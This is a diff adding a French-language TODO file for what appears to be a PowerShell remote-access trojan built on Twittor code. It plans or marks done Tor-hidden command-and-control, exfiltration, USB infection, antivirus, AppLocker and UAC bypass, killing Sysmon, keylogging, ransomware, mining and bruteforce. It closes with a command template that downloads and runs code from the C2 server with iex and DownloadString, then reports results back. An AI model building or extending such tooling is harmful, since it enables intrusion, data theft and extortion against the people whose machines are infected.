@@ -1,0 +1,92 @@
+﻿TODO LIST
+---------------------------------------------
+FEATURES
+OK - Recupérer C2 URL sur pastebin
+OK - Use Tor to Hide c2 trafic. use url from tor2web service -> xwxwxwxwxw.onion.to  OR onion.cab > exple: [string] $Global:c2c = "https://w27ocke7kskw6cyg.onion.to/pntdr"
+- Add WMI key pour cacher la valeur $pc présentement dans REGISTRY
+- Auto persist
+- USB monitor & infect
+- Zipper avant l'envoi exfiltration
+- rc4 encrypt communications with php-ps1
+- Revoir les bug sur InveighCommand et WebInjectCommand
+- Utiliser net trace pour la commande sniffCommand
+- Utiliser arpspoof pour une commande de Spoofing local
+- Corriger la commande ScanCommand
+
+- backdoor googlemail
+- exfil onedrive
+- ajouter rc4 OU aes encrypted canal
+- ajouter commande arpspoof
+- ajouter commande phishing
+		- démarrer un mini serveur web localement, hébergé des fichiers de phishing généré avec phishcloner.exe et modifier le fichier hosts
+
+- inclure le dossier "link"  dans la variable ROOT_FOLDER (config.ini    + agent)
+- add WMI LATERAL MOVE
+
+- remplacer le block de command POST result par une simple command sendC2
+
+- Remplacer toutes les commandes interne à agent par des commande externe (IEX)
+
+- remplacer tout IEX par une ligne obfusqué
+
+- intégrer l'obfuscator dans generator
+
+- empêcher une commande de boucler en rajoutant un contrôle qui va permettre de bypasser si la commande reviens deux fois.
+- autorun cmd
+- sandbox bypass execution
+- Applocker bypass execution
+- AV bypass execution 
+- c2 channel (http, twitter, pastebin, google_drive)
+- deplace cmd into files and call them remotely
+- rc4 communication channel (ps1--php)
+
+DEBUG
+- webcam : l'image est prise mais la commande ne passe pas à l'été "OK", ce qui cause une boucle.
+- remove comments inherited from Twittor initial code (latesttweet, ...etc)
+- change colors in console inherited from Twittor initial code
+- Changer cette identité remarquable: /pntdr/link/xml.php?pc=$pc"
+- keylog : externalisé la commande et l'appeler avec IEX
+- lancer localement les commante qui en ont besoin avec eventviewerbypass uac
+- command de scan
+
+ADD COMMAND
+
+OK - killsysmon 
+OK - proxy
+- inject macro
+OK - powercat
+- webshell
+- smbshell
+- ngrok (tunnel for interactive shell) use Grok-Backdoor github.com/deepzec
+- mining
+- ransomware (aes-key)
+- mimikatz avbypass
+- choco install
+- powershell upgrade
+- switch UAC level
+- add anti-forensics cmde for defense bypass (applocker bypass, ...etc) voir MITTRE ATTA&CK
+- vpn bruteforce
+- bruteforce
+OK - new fileless UAC
+GENERATOR
+
+- inject macro
+OK - getimage (bypass av)
+- remove comments before encrypt 
+
+
+
+COMMAND STANDARD-----------
+
+Function NewCommand { # !cmd|param1|param2 - blabla 
+	[CmdletBinding()] param( 
+	[string]$id
+	)
+	[string] $param1 = $LatestTweet.split('|')[1]
+	[string] $param2 = $LatestTweet.split('|')[2]
+	iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/cmd.txt"))
+	cmd $param1 $param2
+	
+	[string] $result = "OK"
+	sendC2 $pc $result $id
+	} 
